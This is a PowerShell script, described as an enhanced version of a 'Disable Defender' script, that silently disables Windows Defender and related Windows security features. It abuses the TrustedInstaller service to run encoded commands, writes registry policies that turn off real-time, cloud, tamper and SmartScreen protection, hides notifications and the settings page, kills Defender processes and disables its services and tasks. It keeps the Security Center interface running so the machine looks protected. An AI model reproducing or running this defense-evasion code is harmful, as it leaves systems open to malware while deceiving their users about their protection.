# Silent Disable All Security Enhanced Script
# Based on "Disable Defender Script by Zoic"
# Purpose: Disable all Windows Defender and related security features silently while preserving the appearance of functionality
# Targets: Real-time protection, behavior monitoring, cloud protection, Tamper Protection, SmartScreen, notifications, scheduled tasks, and more
# Enhanced to ensure all security layers are disabled with verification

# Check for administrative privileges
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
    Exit
}

# Function to run commands with TrustedInstaller privileges
function Run-Trusted([String]$command) {
    Stop-Service -Name TrustedInstaller -Force -ErrorAction SilentlyContinue
    $service = Get-WmiObject -Class Win32_Service -Filter "Name='TrustedInstaller'"
    $DefaultBinPath = $service.PathName
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $base64Command = [Convert]::ToBase64String($bytes)
    sc.exe config TrustedInstaller binPath= "cmd.exe /c powershell.exe -encodedcommand $base64Command" | Out-Null
    sc.exe start TrustedInstaller | Out-Null
    Start-Sleep -Milliseconds 500  # Brief delay to ensure command execution
    sc.exe config TrustedInstaller binpath= "`"$DefaultBinPath`"" | Out-Null
    Stop-Service -Name TrustedInstaller -Force -ErrorAction SilentlyContinue
}

# Create registry file to disable all security features silently
$regContent = @'
Windows Registry Editor Version 5.00

; Disable core Defender functionalities
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
"DisableAntiSpyware"=dword:00000001
"DisableAntiVirus"=dword:00000001
"AllowFastServiceStartup"=dword:00000000
"PUAProtection"=dword:00000000

; Disable real-time protection and monitoring
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
"DisableRealtimeMonitoring"=dword:00000001
"DisableBehaviorMonitoring"=dword:00000001
"DisableOnAccessProtection"=dword:00000001
"DisableScanOnRealtimeEnable"=dword:00000001
"DisableIOAVProtection"=dword:00000001
"DisableScriptScanning"=dword:00000001
"DisableRoutinelyTakingAction"=dword:00000001

; Disable cloud-based protection
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet]
"DisableBlockAtFirstSeen"=dword:00000001
"SpyNetReporting"=dword:00000000
"LocalSettingOverrideSpynetReporting"=dword:00000000
"SubmitSamplesConsent"=dword:00000000

; Disable scanning options
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Scan]
"DisableArchiveScanning"=dword:00000001
"DisableRemovableDriveScanning"=dword:00000001
"DisableScanningMappedNetworkDrivesForFullScan"=dword:00000001
"DisableScanningNetworkFiles"=dword:00000001
"DisableCatchupFullScan"=dword:00000001
"DisableCatchupQuickScan"=dword:00000001
"ScanParameters"=dword:00000000
"ScheduleDay"=dword:00000008
"ScheduleTime"=dword:00000000
"DisableRestorePoint"=dword:00000001

; Disable signature updates
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates]
"DisableUpdateOnStartupWithoutEngine"=dword:00000001
"SignatureUpdateCatchupInterval"=dword:00000000
"ScheduleDay"=dword:00000008
"ScheduleTime"=dword:00000000

; Disable Tamper Protection
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features]
"TamperProtection"=dword:00000000
"TamperProtectionSource"=dword:00000002

; Disable SmartScreen
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System]
"EnableSmartScreen"=dword:00000000
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen]
"ConfigureAppInstallControlEnabled"=dword:00000000
"ConfigureAppInstallControl"="Anywhere"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer]
"SmartScreenEnabled"="Off"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost]
"EnableWebContentEvaluation"=dword:00000000
"PreventOverride"=dword:00000000
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender]
"VerifiedAndReputableTrustModeEnabled"=dword:00000000

; Suppress notifications
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications]
"DisableNotifications"=dword:00000001
"DisableEnhancedNotifications"=dword:00000001
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting]
"DisableEnhancedNotifications"=dword:00000001
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications]
"DisableEnhancedNotifications"=dword:00000001

; Hide Defender settings page
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
"SettingsPageVisibility"="hide:windowsdefender;"

; Disable additional security services
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense]
"Start"=dword:00000004
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc]
"Start"=dword:00000004
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv]
"Start"=dword:00000004
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter]
"Start"=dword:00000004
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot]
"Start"=dword:00000004
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\webthreatdefsvc]
"Start"=dword:00000004
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\webthreatdefusersvc]
"Start"=dword:00000004
'@

# Save registry file to temp directory
$regPath = "$env:TEMP\silentDisableAllSecurity.reg"
Set-Content -Path $regPath -Value $regContent -Force

# Apply registry changes using TrustedInstaller
$command = "regedit.exe /s `"$regPath`""
Run-Trusted -command $command

# Clean up registry file
Remove-Item -Path $regPath -Force -ErrorAction SilentlyContinue

# Stop critical Defender processes to disable protection
$command = 'Stop-Process -Name MpDefenderCoreService -Force -ErrorAction SilentlyContinue; ' +
           'Stop-Process -Name MsMpEng -Force -ErrorAction SilentlyContinue; ' +
           'Stop-Process -Name Sense -Force -ErrorAction SilentlyContinue'
Run-Trusted -command $command

# Set critical services to disabled
$command = 'sc.exe config WinDefend start= disabled; ' +
           'sc.exe config WdNisSvc start= disabled; ' +
           'sc.exe config Sense start= disabled'
Run-Trusted -command $command

# Ensure Security Center and UI services remain active to maintain appearance
Start-Service -Name wscsvc -ErrorAction SilentlyContinue
Start-Service -Name SecurityHealthService -ErrorAction SilentlyContinue

# Disable Defender scheduled tasks silently
$tasks = Get-ScheduledTask | Where-Object { $_.TaskName -like 'Windows Defender*' }
foreach ($task in $tasks) {
    Disable-ScheduledTask -TaskName $task.TaskName -ErrorAction SilentlyContinue
}

# Verify that Defender is disabled
$defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
if ($defenderStatus -and $defenderStatus.AntivirusEnabled -eq $false -and $defenderStatus.RealTimeProtectionEnabled -eq $false) {
    Write-Host "Windows Defender successfully disabled."
} else {
    Write-Host "Warning: Some Defender components may still be active. Check Tamper Protection or system restrictions."
}

# Prompt for system restart to apply changes
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show('Windows Defender and all related security features have been disabled silently. The Windows Security interface will remain visible but non-functional. Please restart your computer to apply changes.', 'Silent Disable Security', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
